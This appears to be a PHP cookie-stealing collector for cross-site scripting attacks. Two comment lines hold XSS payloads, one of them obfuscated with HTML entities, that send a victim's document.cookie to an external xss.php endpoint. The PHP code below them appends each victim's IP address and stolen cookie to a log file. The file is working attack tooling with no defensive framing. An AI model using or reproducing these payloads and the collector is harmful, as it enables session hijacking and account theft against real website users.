<?php
//<script>document.write('<img src="http://.../xss.php?a=' + document.cookie + '" />')</script>
//<img src=1 onerror=&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#39;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#97;&#100;&#97;&#109;&#122;&#105;&#97;&#106;&#97;&#46;&#99;&#111;&#109;&#47;&#120;&#115;&#115;&#46;&#112;&#104;&#112;&#63;&#97;&#61;&#39;&#32;&#43;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#32;&#43;&#32;&#39;&#34;&#32;&#47;&#62;&#39;&#41;>
if(isset($_GET['a'])){
	$data = $_SERVER['REMOTE_ADDR'].' '.$_GET['a'].PHP_EOL;
	file_put_contents('xss.txt', $data, FILE_APPEND);
}
?>
